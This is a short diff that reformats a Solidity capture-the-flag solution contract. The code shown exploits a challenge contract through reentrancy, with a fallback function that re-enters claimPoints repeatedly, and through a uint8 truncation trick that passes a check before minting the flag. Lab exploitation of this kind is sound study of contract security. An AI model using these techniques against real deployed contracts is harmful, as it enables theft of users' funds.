@@ -20,13 +20,13 @@ contract Challenge6Solution {
 
         // Step 3: Once we have 59 points, upgrade level 5 times
         // Current state: points=59, levels=0
-        for(uint i=0; i<5; i++) {
+        for (uint256 i = 0; i < 5; i++) {
             challenge.upgradeLevel();
         }
         // Current state: points=9, levels=5
 
         // Step 4: Mint the flag
-        // Verify math: 
+        // Verify math:
         // 9 < 10 (Pass)
         // 9 * 5 = 45 >= 30 (Pass)
         // 9 << 5 = 288. uint8(288) = 288 - 256 = 32 (Pass)
@@ -35,7 +35,8 @@ contract Challenge6Solution {
 
     // Step 2: Fallback function re-enters claimPoints
     fallback() external payable {
-        if (count < 58) { // We want 59 total, initial call + 58 re-entries
+        if (count < 58) {
+            // We want 59 total, initial call + 58 re-entries
             count++;
             challenge.claimPoints();
         }
